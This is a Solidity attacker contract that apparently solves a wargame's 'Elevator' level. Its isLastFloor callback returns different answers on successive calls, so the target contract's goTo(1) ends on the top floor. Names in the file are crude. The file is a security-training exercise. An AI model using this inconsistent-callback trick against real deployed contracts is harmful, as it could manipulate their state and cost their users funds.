// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract FuckElevator {
    IElevator elevator;

    bool private firstTime = true;

    constructor(address _address) {
        elevator = IElevator(_address);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstTime) {
            firstTime = false;
            return false;
        }
        return true;
    }

    function fuck() external {
        elevator.goTo(1);
    }
}
